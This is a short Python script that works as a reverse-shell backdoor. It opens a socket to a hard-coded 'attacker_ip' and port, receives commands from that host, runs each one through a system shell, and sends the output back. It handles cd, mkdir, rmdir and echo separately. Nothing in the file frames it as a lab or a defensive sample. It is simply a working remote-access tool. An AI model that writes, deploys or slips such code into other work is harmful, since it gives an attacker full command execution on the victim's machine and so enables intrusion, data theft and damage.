import socket
import subprocess
import os

attacker_ip = '192.168.1.148'
attacker_port = 6996

def get_command():
    while True:
        command = sock.recv(2048)
        command = command.decode()
        if command == 'q':
            break
        elif command[:2] == 'cd' and len(command) > 1:
            try:
                os.chdir(command[3:])
                msg = "Changed directory to " + command[3:]
                sock.send(msg.encode())
                continue
            except:
                continue
        elif command[:5] == 'mkdir' and len(command) > 1:
            try:
                subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                msg = "Make folder successfully !!"
                sock.send(msg.encode())
                continue
            except:
                continue
        elif command[:5] == 'rmdir' and len(command) > 1:
            try:
                subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                msg = "Remove Directory Successfully !!"
                sock.send(msg.encode())
                continue
            except:
                continue
        elif command[:4] == 'echo' and len(command) > 1:
            subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            msg = "echo successfully !!"
            sock.send(msg.encode())
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            sock.send(result)
            continue

def connect_to_attacker():
    global sock
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((attacker_ip, attacker_port))

if __name__ == "__main__":
    connect_to_attacker()
    get_command()
    sock.close()